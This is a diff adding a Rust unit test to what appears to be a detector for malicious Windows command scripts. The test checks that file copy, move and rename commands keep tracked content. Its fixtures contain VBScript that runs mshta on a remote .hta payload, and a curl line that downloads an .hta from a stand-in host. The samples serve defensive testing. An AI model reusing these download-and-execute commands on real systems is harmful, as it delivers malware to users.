@@ -14891,6 +14891,37 @@ mshta renamed.hta"#,
     }
 
     #[test]
+    fn single_source_file_ops_preserve_tracked_content() {
+        for command in [
+            "copy original.vbs renamed.vbs",
+            "xcopy /y original.vbs renamed.vbs",
+            "move /y original.vbs renamed.vbs",
+            "ren original.vbs renamed.vbs",
+        ] {
+            let mut env = Environment::new(&Config::default());
+            env.modified_filesystem.insert(
+                "original.vbs".to_string(),
+                FsEntry::Content {
+                    content: b"CreateObject(\"WScript.Shell\").Run \"mshta https://content-copy.example/payload.hta\"".to_vec(),
+                    append: false,
+                },
+            );
+            interpret_line(command, &mut env);
+            let entry = env
+                .modified_filesystem
+                .get("renamed.vbs")
+                .unwrap_or_else(|| panic!("renamed.vbs missing after {command}"));
+            assert!(
+                matches!(entry, FsEntry::Content { content, .. }
+                    if content.windows(b"content-copy.example".len())
+                        .any(|window| window == b"content-copy.example")),
+                "tracked content was not preserved after {command}: {:?}",
+                entry
+            );
+        }
+    }
+
+    #[test]
     fn xcopy_preserves_download_source_for_later_execution() {
         let report = crate::analyze(
             br#"curl -o original.hta https://xcopy-download.example/payload.hta
